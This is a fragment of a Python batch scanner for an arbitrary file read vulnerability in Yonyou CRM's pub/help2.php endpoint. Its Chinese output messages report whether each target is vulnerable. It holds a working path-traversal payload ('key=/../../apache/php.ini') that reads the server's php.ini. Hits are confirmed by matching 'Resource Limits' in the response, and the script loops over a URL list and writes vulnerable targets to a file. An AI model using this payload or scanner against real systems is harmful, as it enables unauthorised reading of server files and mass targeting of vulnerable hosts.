...
payload="/pub/help2.php?key=/../../apache/php.ini"
    ...
    try:   
        ...
        if response.status_code==200:
            ...
            if "Resource Limits" in content:
                print(url,end=' ')
                print_colored('存在用友crm客户关系管理pub/help2.php接口任意文件读取漏洞 ','green')
                ...
                print(url,end=' ')
                print_colored('用友crm客户关系管理pub/help2.php接口任意文件读取漏洞 ','red')
                print()
    ...
    if args.file:
        with open(args.file,'r') as f1:
            ...
            for u in fs:
                ...
                if args.output:
                    with open(args.output+"/用友crm客户关系管理pub help2.php接口任意文件读取漏洞.txt",'a+',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
